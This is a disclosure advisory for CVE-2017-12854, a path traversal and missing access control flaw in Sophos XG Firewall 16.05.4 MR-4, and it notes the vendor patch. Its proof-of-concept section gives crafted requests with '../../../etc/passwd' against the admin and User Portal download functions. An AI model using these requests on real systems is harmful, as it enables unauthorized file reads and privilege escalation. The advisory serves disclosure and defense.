## Vulnerabilities Summary
The following advisory describe two (2) vulnerabilities, a Path Traversal and a Missing Function Level Access Control, in Sophos XG Firewall 16.05.4 MR-4.

Sophos XG Firewall provides “unprecedented visibility into your network, users, and applications directly from the all-new control center. You also get rich on-box reporting and the option to add Sophos iView for centralized reporting across multiple firewalls”.

## Credit
An independent security researcher has reported this vulnerability to Beyond Security’s SecuriTeam Secure Disclosure program

## Vendor response
The vendor has released patches to address this vulnerability:
“The patches were released as part of SFOS 16.05.5 MR5:
https://community.sophos.com/products/xg-firewall/b/xg-blog/posts/sfos-16-05-5-mr5-released

Our internal bug number was NC-18958, mentioned in the changelog”

CVE: CVE-2017-12854

## Vulnerabilities Details
The Sophos XG Firewall hosts 2 different web portals. The first is the web administration portal used to manage the firewall (Sophos XG Fireweal portal), the second is the “User Portal” used to unprivileged user to access to a restricted group of function like to trace their traffic quotas, to see SMTP quarantined mail and to download authentication client.

The appliance has a web download function in Sophos XG Fireweal portal to allow downloading of a range of file like, logs and certificate keys.

Crafting the download request and adding a path traversal vector to it, an authenticated user, can use this function to download files that are outside the normal scope of the download feature (including sensitive files).

In addition, the function can be called from a low privileged user, a user that is logged on to the User Portal (i.e. Missing Function Level Access Control), a combinations of these two vulnerabilities can be used to compromise the integrity of the server, by allowing a User Portal to elevate his privileges.

## Proof of Concept
Log in the Sophos XG Firewall admin portal



Using developer tools of Firefox (F12) or analyzing the html code of the loaded page (Cyberoam.c$rFt0k3n parameter), extract the csrf code.





Open the Hackbar or use other tools to send a new crafted request:


```
URL https://192.168.0.188:4444/webconsole/Controller?filename=../../../etc/passwd&mode=4010
    postdata csrf=<== THE PARAMETER YOU HAVE FOUND ==>
    referrer https://192.168.0.188:4444/webconsole/webpages/index.jsp
```


This will start the download of the /etc/passwd file:





Create from the admin portal an user of the User Portal (Authentication > User > Add)





Login in the User Portal using the new user



Using developer tools of Firefox or analyzing the html code of the loaded page (Cyberoam.c$rFt0k3n parameter), extract the csrf code.

Open the hack bar or use other tools to send a new crafted request:


```
URL https://192.168.0.188/userportal/Controller?filename=../../../etc/passwd&mode=4010&json=%7B%22lang%22%3A%220%22%7D
    postdata csrf=<== THE PARAMETER YOU HAVE FOUND ==>
    referrer https://192.168.0.188/userportal/webpages/myaccount/index.jsp
```

This will start the download